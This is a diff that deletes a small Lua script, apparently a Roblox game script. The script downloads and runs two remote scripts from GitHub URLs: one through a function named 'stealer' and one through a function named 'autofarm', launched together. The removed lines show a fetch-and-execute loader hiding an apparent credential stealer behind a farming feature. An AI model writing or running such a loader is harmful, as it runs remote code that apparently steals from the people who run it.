@@ -1,9 +1,0 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mathersg4/software/refs/heads/main/pr.lua"))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mathersg4/scripts/refs/heads/main/autofarm"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
